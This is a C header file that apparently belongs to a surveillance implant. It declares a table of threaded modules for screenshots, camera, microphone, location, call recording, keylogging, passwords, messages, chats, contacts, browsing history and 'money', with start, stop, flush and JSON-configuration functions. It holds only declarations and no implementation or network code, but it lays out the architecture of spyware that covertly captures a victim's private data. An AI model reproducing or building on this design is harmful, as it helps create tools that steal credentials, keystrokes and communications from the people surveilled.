#ifndef _MODULE_H
#define _MODULE_H 1

#include <time.h>
#include <json.h>
#include <pthread.h>

#define MODULE_ALL_INDEX -1

#define MODULE_SCREENSHOT_INDEX 0
#define MODULE_SCREENSHOT modulelist[MODULE_SCREENSHOT_INDEX]
#define MODULE_SCREENSHOT_P ((module_screenshot_t *)MODULE_SCREENSHOT.param)
#define MODULE_SCREENSHOT_ENTRY { 0, -1, MODULE_STOPPED, NULL, module_screenshot_main, NULL }
void *module_screenshot_main(void *args);
typedef struct {
   int window;
   int quality;
} module_screenshot_t;

#define MODULE_DEVICE_INDEX 1
#define MODULE_DEVICE modulelist[MODULE_DEVICE_INDEX]
#define MODULE_DEVICE_P ((module_device_t *)MODULE_DEVICE.param)
#define MODULE_DEVICE_ENTRY { 0, -1, MODULE_STOPPED, NULL, module_device_main, NULL }
void *module_device_main(void *args);

#define MODULE_APPLICATION_INDEX 2
#define MODULE_APPLICATION modulelist[MODULE_APPLICATION_INDEX]
#define MODULE_APPLICATION_P ((module_application_t *)MODULE_APPLICATION.param)
#define MODULE_APPLICATION_ENTRY { 0, 0, MODULE_STOPPED, NULL, module_application_main, NULL }
void *module_application_main(void *args);

#define MODULE_POSITION_INDEX 3
#define MODULE_POSITION modulelist[MODULE_POSITION_INDEX]
#define MODULE_POSITION_P ((module_position_t *)MODULE_POSITION.param)
#define MODULE_POSITION_ENTRY { 0, -1, MODULE_STOPPED, NULL, module_position_main, NULL }
void *module_position_main(void *args);

#define MODULE_CAMERA_INDEX 4
#define MODULE_CAMERA modulelist[MODULE_CAMERA_INDEX]
#define MODULE_CAMERA_P ((module_camera_t *)MODULE_CAMERA.param)
#define MODULE_CAMERA_ENTRY { 0, -1, MODULE_STOPPED, NULL, module_camera_main, NULL }
void *module_camera_main(void *args);
typedef struct {
   int quality;
} module_camera_t;

#define MODULE_MOUSE_INDEX 5
#define MODULE_MOUSE modulelist[MODULE_MOUSE_INDEX]
#define MODULE_MOUSE_P ((module_mouse_t *)MODULE_MOUSE.param)
#define MODULE_MOUSE_ENTRY { 0, 0, MODULE_STOPPED, NULL, module_mouse_main, NULL }
void *module_mouse_main(void *args);
typedef struct {
   int width;
   int height;
} module_mouse_t;

#define MODULE_PASSWORD_INDEX 6
#define MODULE_PASSWORD modulelist[MODULE_PASSWORD_INDEX]
#define MODULE_PASSWORD_P ((module_password_t *)MODULE_PASSWORD.param)
#define MODULE_PASSWORD_ENTRY { 0, 0, MODULE_STOPPED, NULL, module_password_main, NULL }
void *module_password_main(void *args);

#define MODULE_URL_INDEX 7
#define MODULE_URL modulelist[MODULE_URL_INDEX]
#define MODULE_URL_P ((module_url_t *)MODULE_URL.param)
#define MODULE_URL_ENTRY { 0, 0, MODULE_STOPPED, NULL, module_url_main, NULL }
void *module_url_main(void *args);

#define MODULE_MESSAGES_INDEX 8
#define MODULE_MESSAGES modulelist[MODULE_MESSAGES_INDEX]
#define MODULE_MESSAGES_P ((module_messages_t *)MODULE_MESSAGES.param)
#define MODULE_MESSAGES_ENTRY { 0, 0, MODULE_STOPPED, NULL, module_messages_main, NULL }
void *module_messages_main(void *args);
typedef struct {
   int enabled;
   int maxsize;
   time_t from;
   time_t to;
} module_messages_t;

#define MODULE_ADDRESSBOOK_INDEX 9
#define MODULE_ADDRESSBOOK modulelist[MODULE_ADDRESSBOOK_INDEX]
#define MODULE_ADDRESSBOOK_P ((module_addressbook_t *)MODULE_ADDRESSBOOK.param)
#define MODULE_ADDRESSBOOK_ENTRY { 0, 0, MODULE_STOPPED, NULL, module_addressbook_main, NULL }
void *module_addressbook_main(void *args);

#define MODULE_CHAT_INDEX 10
#define MODULE_CHAT modulelist[MODULE_CHAT_INDEX]
#define MODULE_CHAT_P ((module_chat_t *)MODULE_CHAT.param)
#define MODULE_CHAT_ENTRY { 0, 0, MODULE_STOPPED, NULL, module_chat_main, NULL }
void *module_chat_main(void *args);

#define MODULE_CALL_INDEX 11
#define MODULE_CALL modulelist[MODULE_CALL_INDEX]
#define MODULE_CALL_P ((module_call_t *)MODULE_CALL.param)
#define MODULE_CALL_ENTRY { 0, 0, MODULE_STOPPED, NULL, module_call_main, NULL }
void *module_call_main(void *args);
typedef struct {
   int record;
   int compression;
   int bufsize;
} module_call_t;

#define MODULE_KEYLOG_INDEX 12
#define MODULE_KEYLOG modulelist[MODULE_KEYLOG_INDEX]
#define MODULE_KEYLOG_P ((module_keylog_t *)MODULE_KEYLOG.param)
#define MODULE_KEYLOG_ENTRY { 0, 0, MODULE_STOPPED, NULL, module_keylog_main, module_keylog_flush }
void *module_keylog_main(void *args);
void module_keylog_flush(void);

#define MODULE_MIC_INDEX 13
#define MODULE_MIC modulelist[MODULE_MIC_INDEX]
#define MODULE_MIC_P ((module_mic_t *)MODULE_MIC.param)
#define MODULE_MIC_ENTRY { 0, 0, MODULE_STOPPED, NULL, module_mic_main, NULL }
void *module_mic_main(void *args);
typedef struct {
   int threshold;
   int autosense;
   int silence;
} module_mic_t;

#define MODULE_MONEY_INDEX 14
#define MODULE_MONEY modulelist[MODULE_MONEY_INDEX]
#define MODULE_MONEY_P ((module_money_t *)MODULE_MONEY.param)
#define MODULE_MONEY_ENTRY { 0, -1, MODULE_STOPPED, NULL, module_money_main, NULL }
void *module_money_main(void *args);

#define MODULE_STOPPED  0
#define MODULE_STARTED  1
#define MODULE_STOPPING 2

typedef struct {
   pthread_t tid;
   int event;
   int status;
   void *param;
   void *(*main)(void *);
   void (*flush)(void);
} module_t;

extern module_t modulelist[];

void parsemodules(json_object *config);
void startmodule(int module);
void stopmodule(int module);
void flushmodule(int module);

#endif /* _MODULE_H */
